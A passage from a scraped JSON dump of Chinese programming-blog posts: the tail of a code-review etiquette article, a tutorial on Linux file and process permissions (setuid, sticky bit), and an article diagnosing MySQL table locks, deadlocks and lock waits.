是指令代码审查相对平常的交流来说，要求更多的机智和谨慎，因为存在高风险把讨论转变成私人争论。你会期望审查者在审查中表示出礼貌，但是奇怪地是，我发现他们走向了另一个方向。多数人永远不会对同事说“给我订书机，再给我拿瓶汽水。”但是我看到过无数审查者用类似的指令来表达反馈，比如，“把这个类移到一个单独的文件里。”宁可在反馈中恼人地绅士。把批注表达成请求或者建议那样，而不是指令。比较用两种不同方式表达的同一个批注：表达成指令的反馈表达成请求的反馈把Foo类移到一个单独的文件里。我们能把Foo类移到一个单独的文件里吗？人们喜欢掌控自己的工作。向作者提出请求给他们带来自主意识。请求也让作者礼貌地反馈更容易。可能他们的选择是有合理的。如果把反馈表达成指令，来自作者的任何反馈都像违反指令。如果你把反馈表达成请求或者问题，作者能简单地回答你。比较对话的好斗程度，取决于审查者怎么表达他们的初始批注：表达成指令的反馈（好斗的）表达成请求的反馈（合作的）审查者：把Foo类移到单独的文件里作者：我不想这么做，因为那样就离Bar类太远了。客户几乎总会一起调用他们。审查者：我们能把Foo类移到单独的文件里吗？作者：可以，但是那样就离Bar类太远了，以及客户一般会一起使用这两个类。你觉得呢？看看当你构建虚拟对话来证明观点把批注表达成请求而非指令的时候，对话变得多么有礼貌。把批注与原则联系在一起，而不是观点当你给作者写批注时，既要给出变更建议，也要给出变更的理由。“现在，这个类既负责下载文件，也负责解析文件。我们应该依照单一责任原则，把它拆分成一个下载类和一个解析类。”这么说会更好，而不是说“我们应该把这个类分成两个。”让你的批注有原则性的立足点，这样能让讨论走向更积极的方向更有建设性。但你有一个具体的原因，比如“我们应该把这个函数写成私有函数，来最小化public借口类”，作者就不能简单地回复“不，我倾向于我的方法。”更确切地说，他们可以，但是因为你演示了改动如何满足目标，而他们只陈述了一个偏好，他们会看起来很傻。软件开发既是艺术也是科学。你不可能永远都能用确定的原则来明确表达代码到底哪里出了问题。有时候代码只是难看或者不符合直觉，不容易确定为什么。在这些情况下，解释你能怎么做，但是保持客观性。如果你说“我发现这不容易理解”，这至少是个客观的陈述；相反，“这莫名其妙”是一个价值判断，不一定适用于所有人。尽可能以链接的形式提供支持证据。团队风格指南的相关部分是你能提供的最佳链接。你也可以链接到语言或者库的文件。高票StackOverflow回答也行，但是离权威文件越远，你的证据变得越不稳固。第二部分：即将上线敬请期待其他小技巧，包括：处理特别大的代码审查识别给予表扬的机会尊重审核的，以及化解僵局由SamanthaMason编辑。插图来自LoraineYow。感谢@global4g为这篇文章的早期版本提供宝贵的反馈。1赞4收藏2评论关于作者：精算狗简介还没来得及写:）个人主页·我的文章·22·", "url_object_id": "a954aebbcc6c42bb9302d1a79cefaa26"},{"title": "Linux 权限控制的基本原理", "url": "http://blog.jobbole.com/114087/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,1,3, ,·", "content": "原文出处：本文来自作者（吕凯）的推荐这里，我们主要介绍Linux系统中，权限控制的基本原理。安全模型在Linux系统中，我们所有的操作实质都是在进行进程访问文件的操作。我们访问文件需要先取得相应的访问权限，而访问权限是通过Linux系统中的安全模型获得的。对于Linux系统中的安全模型，我们需要知道下面两点Linux系统上最初的安全模型叫DAC,全称是DiscretionaryAccessControl，翻译为自主访问控制。后来又增加设计了一个新的安全模型叫MAC,全称是MandatoryAccessControl,翻译为强制访问控制。注意,MAC和DAC不是互斥的，DAC是最基本的安全模型，也是通常我们最常用到的访问控制机制是Linux必须具有的功能，而MAC是构建在DAC之上的加强安全机制，属于可选模块。访问前，Linux系统通常都是先做DAC检查，如果没有通过则操作直接失败;如果通过DAC检查并且系统支持MAC模块，再做MAC权限检查。为区分两者，我们将支持MAC的Linux系统称作SELinux,表示它是针对Linux的安全加强系统。这里，我们将讲述Linux系统中的DAC安全模型。DAC安全模型DAC的核心内容是：在Linux中，进程理论上所拥有的权限与执行它的用户的权限相同。其中涉及的一切内容，都是围绕这个核心进行的。用户和组ID信息控制用户、组、口令信息通过/etc/passwd和/etc/group保存用户和组信息，通过/etc/shadow保存密码口令及其变动信息，每行一条记录。用户和组分别用UID和GID表示，一个用户可以同时属于多个组，默认每个用户必属于一个与之UID同值同名的GID。对于/etc/passwd,每条记录字段分别为用户名:口令（在/etc/shadow加密保存）：UID:GID（默认UID）:描述注释:主目录:登录shell(第一个运行的程序)对于/etc/group，每条记录字段分别为组名：口令（一般不存在组口令）：GID：组成员用户列表（逗号分割的用户UID列表）对于/etc/shadow，每条记录字段分别为：登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:举例以下是对用户和组信息的举例。/etc/shadow中的口令信息为加密存储，不举例。$cat/etc/passwd|head-n5root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync$cat/etc/group|head-n5root:x:0:daemon:x:1:bin:x:2:sys:x:3:adm:x:4:miracle12345678910111213$cat/etc/passwd|head-n5root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync$cat/etc/group|head-n5root:x:0:daemon:x:1:bin:x:2:sys:x:3:adm:x:4:miracle文件权限控制信息文件类型Linux中的文件有如下类型：普通文件，又包括文本文件和二进制文件，可用touch创建；套接字文件，用于网络通讯，一般由应用程序在执行中间接创建；管道文件是有名管道，而非无名管道，可用mkfifo创建；字符文件和块文件均为设备文件，可用mknod创建；链接文件是软链接文件，而非硬链接文件,可用ln创建。访问权限控制组分为三组进行控制：user包含对文件属主设定的权限group包含对文件属组设定的权限others包含对其他者设定的权限可设定的权限下面给出常见（但非全部）的权限值，包括：r表示具有读权限。w表示具有写权限。x一般针对可执行文件/目录，表示具有执行/搜索权限。s一般针对可执行文件/目录，表示具有赋予文件属主权限的权限，只有user和group组可以设置该权限。t一般针对目录，设置粘滞位后，有权限的用户只能写、删除自己的文件,否则可写、删除目录所有文件。旧系统还表示可执行文件运行后将text拷贝到交换区提升速度。举例通过ls-l可以查看到其文件类型及权限，通过chmod修改权限。举例来说，$ls-l/usr/bin/qemu-i386-rwxr-xr-x1rootroot21490808月132014/usr/bin/qemu-i386$chmod1775test/$ls-l|greptestdrwxrwxr-t2miraclevideo40967月2009:31test$chmod2777test2/$ls-l|greptest2drwxrwsrwx2miraclevideo40967月2009:32test2$chmod4777test3/$ls-l|greptest3drwsrwxrwx2miraclevideo40967月2009:33test31234567891011$ls-l/usr/bin/qemu-i386-rwxr-xr-x1rootroot21490808月132014/usr/bin/qemu-i386$chmod1775test/$ls-l|greptestdrwxrwxr-t2miraclevideo40967月2009:31test$chmod2777test2/$ls-l|greptest2drwxrwsrwx2miraclevideo40967月2009:32test2$chmod4777test3/$ls-l|greptest3drwsrwxrwx2miraclevideo40967月2009:33test3输出中，第1个字符表示文件类型，其中，普通文件(-)、目录文件(d)、套接字文件(s)，管道文件(p)，字符文件(c)，块文件(b)，链接文件(l)；第2个字符开始的-rwxr-xr-x部分表示文件的权限位，共有9位。对于文件/usr/bin/qemu-i386,这个权限控制的含义是：第2~4位的rwx表示该文件可被它的owner（属主）以r或w或x的权限访问。第5~7位的r-x表示该文件可被与该文件同一属组的用户以r或x的权限访问第8~10位的r-x表示该文件可被其它未知用户以r或x的权限访问。对于test/,test2/,test3/设定的权限：r,w,x权限对每一权限控制组的权限用一位8进制来表示；例如：755表示rwxr-xr-x。s,t权限会替代x位置显示；设定s,t权限则需在对应的、用于控制r,w,x的8进制权限控制组前追加数字；s权限用于属主属组控制，t用于其它控制。设定属主s需追加4,设定属组s追加2,设定其它者t权限追加1；例如前面对test/设定t,则用1775,表示rwxrwxr-t。进程权限控制信息进程权限对于进程，有如下属性与文件访问权限相关：effectiveuserid:进程访问文件权限相关的UID（简写为euid）。effectivegroupid:进程访问文件权限相关的GID（简写为egid）。realuserid:创建该进程的用户登录系统时的UID（简写为ruid）。realgroupid:创建该进程的用户登录系统时的GID（简写为rgid）。savedsetuserid:拷贝自euid。savedsetgroupid:拷贝自egid。举例我们可以使用ps和top选择查看具有euid和ruid的进程。或者通过top来查看进程的euid和ruid通过top来查看的例子：首先输入top得到类似如下$top-d10.10top-15:50:39up9days,1:42,9users,loadaverage:0.13,0.16,0.21Tasks:287total,2running,284sleeping,0stopped,1zombieCpu(s):20.8%us,4.6%sy,0.0%ni,72.5%id,2.1%wa,0.0%hi,0.0%si,0.0%stMem:7707276ktotal,7574252kused,133024kfree,154872kbuffersSwap:1998844ktotal,223744kused,1775100kfree,3330212kcachedPIDUSERPRNIVIRTRESSHRS%CPU%MEMTIME+COMMAND31603miracle2002368m681m52mS69.1206:07.74firefox1507root200451m188m97mS22.5193:49.86Xorg....1234567891011$top-d10.10top-15:50:39up9days,1:42,9users,loadaverage:0.13,0.16,0.21Tasks:287total,2running,284sleeping,0stopped,1zombieCpu(s):20.8%us,4.6%sy,0.0%ni,72.5%id,2.1%wa,0.0%hi,0.0%si,0.0%stMem:7707276ktotal,7574252kused,133024kfree,154872kbuffersSwap:1998844ktotal,223744kused,1775100kfree,3330212kcachedPIDUSERPRNIVIRTRESSHRS%CPU%MEMTIME+COMMAND31603miracle2002368m681m52mS69.1206:07.74firefox1507root200451m188m97mS22.5193:49.86Xorg....这里通过-d选项延长top的刷新频率便于操作。此处可见，只有USER字段，表示相应进程的effectiveuserid.打开readuserid的显示选项在top命令运行期间，输入f,可以看见类似如下行：c:RUSER=Realusername1c:RUSER=Realusername输入c即可打开Realusername的显示开关。*C:RUSER=Realusername1*C:RUSER=Realusername最后Return回车回到top中，即可看到realuserid的选项此时输入o,可调整列次序最终我们可看到包含effectiveuserid和realuserid的输出如下：top-15:57:58up9days,1:49,9users,loadaverage:0.23,0.22,0.23Tasks:286total,1running,284sleeping,0stopped,1zombieCpu(s):3.9%us,1.4%sy,0.0%ni,94.6%id,0.1%wa,0.0%hi,0.0%si,0.0%stMem:7707276ktotal,7539776kused,167500kfree,154996kbuffersSwap:1998844ktotal,225132kused,1773712kfree,3300036kcachedPIDUSERRUSERPRNIVIRTRESSHRS%CPU%MEMTIME+COMMAND31603miraclemiracle2002376m688m52mS49.2206:24.14firefox1507rootroot200451m188m97mS32.5194:06.27Xorg....12345678910top-15:57:58up9days,1:49,9users,loadaverage:0.23,0.22,0.23Tasks:286total,1running,284sleeping,0stopped,1zombieCpu(s):3.9%us,1.4%sy,0.0%ni,94.6%id,0.1%wa,0.0%hi,0.0%si,0.0%stMem:7707276ktotal,7539776kused,167500kfree,154996kbuffersSwap:1998844ktotal,225132kused,1773712kfree,3300036kcachedPIDUSERRUSERPRNIVIRTRESSHRS%CPU%MEMTIME+COMMAND31603miraclemiracle2002376m688m52mS49.2206:24.14firefox1507rootroot200451m188m97mS32.5194:06.27Xorg....其中，PID是对应进程，USER是对应的effectiveuser,RUSER是对应的realuser。进程访问文件的权限控制策略规则进程访问文件大致权限控制策略对于进程访问文件而言，最重要的是euid,所以其权限属性均以euid为“中心”。进程的euid一般默认即为其ruid值若可执行文件的可执行权限位为s，进程对其调用exec后，其euid被设置为该可执行文件的userid进程的savedsetuserid拷贝自euid.当进程的euid与文件的userid匹配时，进程才具有文件user权限位所设定的权限组权限egid的控制规则类似。通过exec执行文件修改权限属性通过exec调用可执行文件之时：进程ruid值始终不变；savedset-userID始终来自euid；euid值取决于文件的set-user-ID位是否被设置。如下：IDset-user-IDbitoffset-user-IDbitonrealuserIDunchangedunchangedeffectiveuserIDunchangedsetfromuserIDofprogramfilesavedset-userIDcopiedfromeffectiveuserIDcopiedfromeffectiveuserID通过setuid(uid)系统调用修改权限属性通过setuid(uid)修改权限属性之时：superuser可顺利修改ruid,euid,savedset-userID；unprivilegeduser只能在uid与ruid相等时修改euid,其它无法修改。如下：IDsuperuserunprivilegeduserrealuserIDsettouidunchangedeffectiveuserIDsettouidsettouidsavedset-userIDsettouidunchanged举例再举几个比较特别的例子：设置了set-user-id$ls-l/usr/bin/sudo-rwsr-xr-x1rootroot712882月282013/usr/bin/sudo12$ls-l/usr/bin/sudo-rwsr-xr-x1rootroot712882月282013/usr/bin/sudo如前所述，这个输出的含义是，对于/usr/bin/sudo文件，第1~3位的rws表示该文件可被它的owner（属主）以r或w或s的权限访问第4~6位的r-x表示该文件可被与该文件同一属组的用户以r或x的权限访问。第7~9位的r-x表示该文件可被其它未知用户以r或x的权限访问。这样设置之后，对于owner，具有读、写、执行权限，这一点没有什么不同。但是对于不属于root组的普通用户进程来说，却大不相同。普通用户进程执行sudo命令时通过其others中的x获得执行权限，再通过user中的s使得普通用户进程临时具有了sudo可执行文件属主(root)的权限，即超级权限。这也是为什么通过sudo命令就可以让普通用户执行许多管理员权限的命令的原因。设置了stick-bit$ls-l/|greptmpdrwxrwxrwt25rootroot122887月2009:09tmp12$ls-l/|greptmpdrwxrwxrwt25rootroot122887月2009:09tmp这样设置之后，对于/tmp目录，任何人都具有读、写、执行权限，这一点没有什么不同。但是对于others部分设置了粘滞位t,其功能却大不相同。若目录没设置粘滞位，任何对目录有写权限者都则可删除其中任何文件和子目录，即使他不是相应文件的所有者，也没有读或写许可;设置粘滞位后，用户就只能写或删除属于他的文件和子目录。这也是为什么任何人都能向/tmp目录写文件、目录，却只能写和删除自己拥有的文件或目录的原因。举一个man程序的应用片断，描述set-user-id和savedset-user-id的使用man程序可以用来显示在线帮助手册，man程序可以被安装指定set-user-ID或者set-group-ID为一个指定的用户或者组。man程序可以读取或者覆盖某些位置的文件，这一般由一个配置文件(通常是/etc/man.config或者/etc/manpath.config)或者命令行选项来进行配置。man程序可能会执行一些其它的命令来处理包含显示的man手册页的文件。为防止处理出错，man会从两个特权之间进行切换：运行man命令的用户特权，以及man程序的拥有者的特权。需要抓住的主线：当只执行man之时，进程特权就是man用户的特权，当通过man执行子进程（如通过!bash引出shell命令）时，用户切换为当前用户，执行完又切换回去。过程如下：假设man程序文件被用户man所拥有，并且已经被设置了它的set-user-ID位，当我们exec它的时候，我们有如下情况：realuserID=我们的用户UIDeffectiveuserID=man用户UIDsavedset-user-ID=man用户UIDman程序会访问需要的配置文件和man手册页。这些文件由man用户所拥有，但是由于effectiveuserID是man,文件的访问就被允许了。在man为我们运行任何命令的时候，它会调用setuid(getuid()))(getuid()返回的是realuserid).因为我们不是superuser进程，这个变化只能改变effectiveuserID.我们会有如下情况：realuserID=我们的用户UID(不会被改变)effectiveuserID=我们的用户UIDsavedset-user-ID=man的用户UID(不会被改变)现在man进程运行的时候把我们得UID作为它的effectiveuserID.这也就是说，我们只能访问我们拥有自己权限的文件。也就是说，它能够代表我们安全地执行任何filter.当filter做完了的时候，man会调用setuid(euid).这里，euid是man用户的UID.(这个ID是通过man调用geteuid来保存的)这个调用是可以的，因为setuid的参数和savedset-user-ID是相等的。(这也就是为什么我们需要savedset-user-ID).这时候我们会有如下情况：realuserID=我们的用户UID(不会被改变)effectiveuserID=man的UIDsavedset-user-ID=man的用户UID(不会被改变)由于effectiveuserID是man,现在man程序可以操作它自己的文件了。通过这样使用savedset-user-ID,我们可以在进程开始和结束的时候通过程序文件的set-user-ID来使用额外的权限。然而，期间我们却是以我们自己的权限运行的。如果我们无法在最后切换回savedset-user-ID,我们就可能会在我们运行的时候保留额外的权限。下面我们来看看如果man启动一个shell的时候会发生什么：这里的shell是man使用fork和exec来启动的。因为这时realuserID和effectiveuserID都是我们的普通用户UID(参见step3)，所以shell没有其它额外的权限.启动的shell无法访问man的savedset-user-ID(man),因为shell的savedset-user-ID是由exec从effectiveuserID拷贝过来的。在执行exec的子进程(shell)中，所有的userID都是我们的普通用户ID.实际上，我们描述man使用setuid函数的方法不是特别正确，因为程序可能会set-user-ID为root.这时候，setuid会把所有三种uid都变成你设置的id，但是我们只需要设置effectiveuserID.1赞收藏评论", "url_object_id": "20d7b616b6fb5b1d5bcbf0b78222d68f"},{"title": "MySQL 在并发场景下的问题及解决思路", "url": "http://blog.jobbole.com/113968/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "praise_nums": 1, "fav_nums": 3, "comments_nums": 1, "tags": "2,0,1,8,/,0,5,/,1,1, ,·", "content": "原文出处：李平1、背景对于数据库系统来说在多用户并发条件下提高并发性的同时又要保证数据的一致性一直是数据库系统追求的目标，既要满足大量并发访问的需求又必须保证在此条件下数据的安全，为了满足这一目标大多数数据库通过锁和事务机制来实现，MySQL数据库也不例外。尽管如此我们仍然会在业务开发过程中遇到各种各样的疑难问题，本文将以案例的方式演示常见的并发问题并分析解决思路。2、表锁导致的慢查询的问题首先我们看一个简单案例，根据ID查询一条用户信息：mysql&gt;select*fromuserwhereid=6;这个表的记录总数为3条，但却执行了13秒。出现这种问题我们首先想到的是看看当前MySQL进程状态：从进程上可以看出select语句是在等待一个表锁，那么这个表锁又是什么查询产生的呢？这个结果中并没有显示直接的关联关系，但我们可以推测多半是那条update语句产生的（因为进程中没有其他可疑的SQL），为了印证我们的猜测，先检查一下user表结构：果然user表使用了MyISAM存储引擎，MyISAM在执行操作前会产生表锁，操作完成再自动解锁。如果操作是写操作，则表锁类型为写锁，如果操作是读操作则表锁类型为读锁。正如和你理解的一样写锁将阻塞其他操作(包括读和写)，这使得所有操作变为串行；而读锁情况下读-读操作可以并行，但读-写操作仍然是串行。以下示例演示了显式指定了表锁（读锁），读-读并行，读-写串行的情况。显式开启/关闭表锁，使用locktableuserread/write;unlocktables;session1:session2：可以看到会话1启用表锁（读锁）执行读操作，这时会话2可以并行执行读操作，但写操作被阻塞。接着看：session1:session2:当session1执行解锁后，seesion2则立刻开始执行写操作，即读-写串行。总结：到此我们把问题的原因基本分析清楚，总结一下——MyISAM存储引擎执行操作时会产生表锁，将影响其他用户对该表的操作，如果表锁是写锁，则会导致其他用户操作串行，如果是读锁则其他用户的读操作可以并行。所以有时我们遇到某个简单的查询花了很长时间，看看是不是这种情况。解决办法：1）、尽量不用MyISAM存储引擎，在MySQL8.0版本中已经去掉了所有的MyISAM存储引擎的表，推荐使用InnoDB存储引擎。2）、如果一定要用MyISAM存储引擎，减少写操作的时间；3、线上修改表结构有哪些风险？如果有一天业务系统需要增大一个字段长度，能否在线上直接修改呢？在回答这个问题前，我们先来看一个案例：以上语句尝试修改user表的name字段长度，语句被阻塞。按照惯例，我们检查一下当前进程：从进程可以看出alter语句在等待一个元数据锁，而这个元数据锁很可能是上面这条select语句引起的，事实正是如此。在执行DML（select、update、delete、insert）操作时，会对表增加一个元数据锁，这个元数据锁是为了保证在查询期间表结构不会被修改，因此上面的alter语句会被阻塞。那么如果执行顺序相反，先执行alter语句，再执行DML语句呢？DML语句会被阻塞吗？例如我正在线上环境修改表结构，线上的DML语句会被阻塞吗？答案是：不确定。在MySQL5.6开始提供了onlineddl功能，允许一些DDL语句和DML语句并发，在当前5.7版本对onlineddl又有了增强，这使得大部分DDL操作可以在线进行。详见：https://dev.mysql.com/doc/refman/5.7/en/innodb-create-index-overview.html所以对于特定场景执行DDL过程中，DML是否会被阻塞需要视场景而定。总结：通过这个例子我们对元数据锁和onlineddl有了一个基本的认识，如果我们在业务开发过程中有在线修改表结构的需求，可以参考以下方案：1、尽量在业务量小的时间段进行；2、查看官方文档，确认要做的表修改可以和DML并发，不会阻塞线上业务；3、推荐使用percona公司的pt-online-schema-change工具，该工具被官方的onlineddl更为强大，它的基本原理是：通过insert…select…语句进行一次全量拷贝，通过触发器记录表结构变更过程中产生的增量，从而达到表结构变更的目的。例如要对A表进行变更，主要步骤为：创建目的表结构的空表，A_new;在A表上创建触发器，包括增、删、改触发器;通过insert…select…limitN语句分片拷贝数据到目的表Copy完成后，将A_new表rename到A表。4、一个死锁问题的分析在线上环境下死锁的问题偶有发生，死锁是因为两个或多个事务相互等待对方释放锁，导致事务永远无法终止的情况。为了分析问题，我们下面将模拟一个简单死锁的情况，然后从中总结出一些分析思路。演示环境：MySQL5.7.20事务隔离级别：RR表user：CREATETABLE`USER`(`ID`INT(11)NOTNULLAUTO_INCREMENT,`NAME`VARCHAR(300)DEFAULTNULL,`AGE`INT(11)DEFAULTNULL,PRIMARYKEY(`ID`))ENGINE=INNODBAUTO_INCREMENT=5DEFAULTCHARSET=UTF8123456CREATETABLE`USER`(`ID`INT(11)NOTNULLAUTO_INCREMENT,`NAME`VARCHAR(300)DEFAULTNULL,`AGE`INT(11)DEFAULTNULL,PRIMARYKEY(`ID`))ENGINE=INNODBAUTO_INCREMENT=5DEFAULTCHARSET=UTF8下面演示事务1、事务2工作的情况：事务1事务2事务监控T1begin;QueryOK,0rowsaffected(0.00sec)begin;QueryOK,0rowsaffected(0.00sec)T2select*fromuserwhereid=3forupdate;+—-+——+——+|id|name|age|+—-+——+——+|3|sun|20|+—-+——+——+1rowinset(0.00sec)select*fromuserwhereid=4forupdate;+—-+——+——+|id|name|age|+—-+——+——+|4|zhou|21|+—-+——+——+1rowinset(0.00sec)select*frominformation_schema.INNODB_TRX；通过查询元数据库innodb事务表，监控到当前运行事务数为2，即事务1、事务2。T3updateusersetname=’haha’whereid=4;因为id=4的记录已被事务2加上行锁，该语句将阻塞监控到当前运行事务数为2。T4阻塞状态updateusersetname=’hehe’whereid=3;ERROR1213(40001):Deadlockfoundwhentryingtogetlock;tryrestartingtransactionid=3的记录已被事务1加上行锁，而本事务持有id=4的记录行锁，此时InnoDB存储引擎检查出死锁，本事务被回滚。事务2被回滚，事务1仍在运行中，监控当前运行事务数为1。T5QueryOK,1rowaffected(20.91sec)Rowsmatched:1Changed:1Warnings:0由于事务2被回滚，原来阻塞的update语句被继续执行。监控当前运行事务数为1。T6commit；QueryOK,0rowsaffected(0.00sec)事务1已提交、事务2已回滚，监控当前运行事务数为0。这是一个简单的死锁场景，事务1、事务2彼此等待对方释放锁，InnoDB存储引擎检测到死锁发生，让事务2回滚，这使得事务1不再等待事务B的锁，从而能够继续执行。那么InnoDB存储引擎是如何检测到死锁的呢？为了弄明白这个问题，我们先检查此时InnoDB的状态：showengineinnodbstatusG————————LATESTDETECTEDDEADLOCK————————2018-01-1412:17:130x70000f1cc000***(1)TRANSACTION:TRANSACTION5120,ACTIVE17secstartingindexreadmysqltablesinuse1,locked1LOCKWAIT3lockstruct(s),heapsize1136,2rowlock(s)MySQLthreadid10,OSthreadhandle123145556967424,queryid2764localhostrootupdatingupdateusersetname=’haha’whereid=4***(1)WAITINGFORTHISLOCKTOBEGRANTED:RECORDLOCKSspaceid94pageno3nbits80indexPRIMARYoftabletest.usertrxid5120lock_modeXlocksrecbutnotgapwaitingRecordlock,heapno5PHYSICALRECORD:n_fields5;compactformat;infobits00:len4;hex80000004;asc;;1:len6;hex0000000013fa;asc;;2:len7;hex520000060129a6;ascR);;3:len4;hex68616861;aschaha;;4:len4;hex80000015;asc;;***(2)TRANSACTION:TRANSACTION5121,ACTIVE12secstartingindexreadmysqltablesinuse1,locked13lockstruct(s),heapsize1136,2rowlock(s)MySQLthreadid11,OSthreadhandle123145555853312,queryid2765localhostrootupdatingupdateusersetname=’hehe’whereid=3***(2)HOLDSTHELOCK(S):RECORDLOCKSspaceid94pageno3nbits80indexPRIMARYoftabletest.usertrxid5121lock_modeXlocksrecbutnotgapRecordlock,heapno5PHYSICALRECORD:n_fields5;compactformat;infobits00:len4;hex80000004;asc;;1:len6;hex0000000013fa;asc;;2:len7;hex520000060129a6;ascR);;3:len4;hex68616861;aschaha;;4:len4;hex80000015;asc;;***(2)WAITINGFORTHISLOCKTOBEGRANTED:RECORDLOCKSspaceid94pageno3nbits80indexPRIMARYoftabletest.usertrxid5121lock_modeXlocksrecbutnotgapwaitingRecordlock,heapno7PHYSICALRECORD:n_fields5;compactformat;infobits00:len4;hex80000003;asc;;1:len6;hex0000000013fe;asc;;2:len7;hex5500000156012f;ascUV/;;3:len4;hex68656865;aschehe;;4:len4;hex80000014;asc;;***WEROLLBACKTRANSACTION(2)InnoDB状态有很多指标，这里我们截取死锁相关的信息，可以看出InnoDB可以输出最近出现的死锁信息，其实很多死锁监控工具也是基于此功能开发的。在死锁信息中，显示了两个事务等待锁的相关信息（蓝色代表事务1、绿色代表事务2），重点关注：WAITINGFORTHISLOCKTOBEGRANTED和HOLDSTHELOCK(S)。WAITINGFORTHISLOCKTOBEGRANTED表示当前事务正在等待的锁信息，从输出结果看出事务1正在等待heapno为5的行锁，事务2正在等待heapno为7的行锁；HOLDSTHELOCK(S)：表示当前事务持有的锁信息，从输出结果看出事务2持有heapno为5行锁。从输出结果看出，最后InnoDB回滚了事务2。那么InnoDB是如何检查出死锁的呢？我们想到最简单方法是假如一个事务正在等待一个锁，如果等待时间超过了设定的阈值，那么该事务操作失败，这就避免了多个事务彼此长等待的情况。参数innodb_lock_wait_timeout正是用来设置这个锁等待时间的。如果按照这个方法，解决死锁是需要时间的（即等待超过innodb_lock_wait_timeout设定的阈值），这种方法稍显被动而且影响系统性能，InnoDB存储引擎提供一个更好的算法来解决死锁问题，wait-forgraph算法。简单的说，当出现多个事务开始彼此等待时，启用wait-forgraph算法，该算法判定为死锁后立即回滚其中一个事务，死锁被解除。该方法的好处是：检查更为主动，等待时间短。下面是wait-forgraph算法的基本原理：为了便于理解，我们把死锁看做4辆车彼此阻塞的场景：4辆车看做4个事务，彼此等待对方的锁，造成死锁。wait-forgraph算法原理是把事务作为节点，事务之间的锁等待关系，用有向边表示，例如事务A等待事务B的锁，就从节点A画一条有向边到节点B，这样如果A、B、C、D构成的有向图，形成了环，则判断为死锁。这就是wait-forgraph算法的基本原理。总结：1、如果我们业务开发中出现死锁如何检查出？刚才已经介绍了通过监控InnoDB状态可以得出，你可以做一个小工具把死锁的记录收集起来，便于事后查看。2、如果出现死锁，业务系统应该如何应对？从上文我们可以看到当InnoDB检查出死锁后，对客户端报出一个Deadlockfoundwhentryingtogetlock;tryrestartingtransaction信息，并且回滚该事务，应用端需要针对该信息，做事务重启的工作，并保存现场日志事后做进一步分析，避免下次死锁的产生。5、锁等待问题的分析在业务开发中死锁的出现概率较小，但锁等待出现的概率较大，锁等待是因为一个事务长时间占用锁资源，而其他事务一直等待前个事务释放锁。事务1事务2事务监控T1begin;QueryOK,0rowsaffected(0.00sec)begin;QueryOK,0rowsaffected(0.00sec)T2select*fromuserwhereid=3forupdate;+—-+——+——+|id|name|age|+—-+——+——+|3|sun|20|+—-+——+——+1rowinset(0.00sec)其他查询操作select*frominformation_schema.INNODB_TRX；通过查询元数据库innodb事务表，监控到当前运行事务数为2，即事务1、事务2。T3其他查询操作updateusersetname=’hehe’whereid=3;因为id=3的记录被事务1加上行锁，所以该语句将阻塞（即锁等待）监控到当前运行事务数为2。T4其他查询操作ERROR1205(HY000):Lockwaittimeoutexceeded;tryrestartingtransaction锁等待时间超过阈值，操作失败。注意：此时事务2并没有回滚。监控到当前运行事务数为2。T5commit;事务1已提交，事务2未提交，监控到当前运行事务数为1。从上述可知事务1长时间持有id=3的行锁，事务2产生锁等待，等待时间超过innodb_lock_wait_timeout后操作中断，但事务并没有回滚。如果我们业务开发中遇到锁等待，不仅会影响性能，还会给你的业务流程提出挑战，因为你的业务端需要对锁等待的情况做适应的逻辑处理，是重试操作还是回滚事务。在MySQL元数据表中有对事务、锁等待的信息进行收集，例如information_schema数据库下的INNODB_LOCKS、INNODB_TRX、INNODB_LOCK_WAITS，你可以通过这些表观察你的业务系统锁等待的情况。你也可以用一下语句方便的查询事务和锁等待的关联关系：SELECTR.TRX_IDWAITING_TRX_ID,R.TRX_MYSQL_THREAD_IDWAITING_THREAD,R.TRX_QUERYWATING_QUERY,B.TRX_IDBLOCKING_TRX_ID,B.TRX_MYSQL_THREAD_IDBLOCKING_THREAD,B.TRX_QUERYBLOCKING_QUERYFROMINFORMATION_SCHEMA.INNODB_LOCK_WAITSWINNERJOININFORMATION_SCHEMA.INNODB_TRXBONB.TRX_ID=W.BLOCKING_TRX_IDINNERJOININFORMATION_SCHEMA.INNODB_TRXRONR.TRX_ID=W.REQUESTING_TRX_ID;123456789SELECTR.TRX_IDWAITING_TRX_ID,R.TRX_MYSQL_THREAD_IDWAITING_THREAD,R.TRX_QUERYWATING_QUERY,B.TRX_IDBLOCKING_TRX_ID,B.TRX_MYSQL_THREAD_IDBLOCKING_THREAD,B.TRX_QUERYBLOCKING_QUERYFROMINFORMATION_SCHEMA.INNODB_LOCK_WAITSWINNERJOININFORMATION_SCHEMA.INNODB_TRXBONB.TRX_ID=W.BLOCKING_TRX_IDINNERJOININFORMATION_SCHEMA.INNODB_TRXRONR.TRX_ID=W.REQUESTING_TRX_ID;结果：waiting_trx_id:5132waiting_thread:11wating_query:updateusersetname=’hehe’whereid=3blocking_trx_id:5133blocking_thread:10blocking_query:NULL总结：1、请对你的业务系统做锁等待的监控，这有助于你了解当前数据库锁情况，以及为你优化业务程序提供帮助；2、业务系统中应该对锁等待超时的情况做合适的逻辑判断。6、小结本文通过几个简单的示例介绍了我们常用的几种MySQL并发问题，并尝试得出针对这些问题我们排查的思路。文中涉及事务、表锁、元数据锁、行锁，但引起并发问题的远远不止这些，例如还有事务隔离级别、GAP锁等。真实的并发问题可能多而复杂，但排查思路和方法却是可以复用，在本文中我们使用了showprocesslist;showengineinnodbstatus;以及查询元数据表的方法来排查发现问题，如果问题涉及到了复制，还需要借助master/slave监控来协助。参考资料：姜承尧《InnoDB存储引擎》李宏哲杨挺《MySQL排查指南》何登成http://hedengcheng.com1赞3收藏1评论", "url_object_id": "00300456460ea6d4134a02e6861bd127"},{"title": "比起 